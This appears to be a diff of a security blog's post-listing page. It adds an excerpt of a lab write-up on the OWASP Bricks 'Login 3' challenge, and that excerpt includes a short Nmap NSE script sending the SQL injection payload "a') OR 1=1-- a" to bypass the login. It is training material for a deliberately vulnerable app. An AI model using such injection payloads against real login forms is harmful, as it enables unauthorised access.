@@ -159,6 +159,21 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Bricks Login 3
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.
+Challenge Solution Login level 3 is just a slightly harder SQL injection as it add brackets. Here’s an example: SQL Query: SELECT * FROM users WHERE name=(&#39;1&#39;) and password=(&#39;1&#39;) LIMIT 0,1.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require &#34;http&#34; local shortport = require &#34;shortport&#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[&#39;username&#39;]=&#34;a&#39;) OR 1=1-- a&#34; r[&#39;passwd&#39;]=&#34;test&#34; r[&#39;submit&#39;]=&#34;Submit&#34; resp = http.post(host,port,&#34;/login-3/index.php&#34;,nil,nil,r) final = string.match(resp.body, &#39;&lt;p&gt;.*alert%-box.-&gt;(.-)&lt;a.*&lt;/p&gt;&#39;) query = string.match(resp.body, &#34;.*SQL Query(.*)&lt;a.*&lt;/div&gt;&#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-12-03 16:23:36 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;249 words</footer>
+  <a class="entry-link" aria-label="post link to Bricks Login 3" href="https://callmeks.github.io/posts/bricks-login-3/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">Bricks Login 2
     </h2>
   </header>
@@ -185,24 +200,12 @@ Challenge Solution Login level 1 is just a simple SQL injection. The hardest par
   <footer class="entry-footer"><span title='2024-12-03 16:23:31 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;236 words</footer>
   <a class="entry-link" aria-label="post link to Bricks Login 1" href="https://callmeks.github.io/posts/bricks-login-1/"></a>
 </article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Journey of Creating Android CTF
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Overview about the journey I have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.
-PART 0 Here’s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-12-03 16:07:05 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1133 words</footer>
-  <a class="entry-link" aria-label="post link to Journey of Creating Android CTF" href="https://callmeks.github.io/posts/journey-of-creating-android-ctf/"></a>
-</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="prev" href="https://callmeks.github.io/posts/page/3/">
       «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="https://callmeks.github.io/posts/page/5/">Next&nbsp;&nbsp;»
     </a>
   </nav>
 </footer>
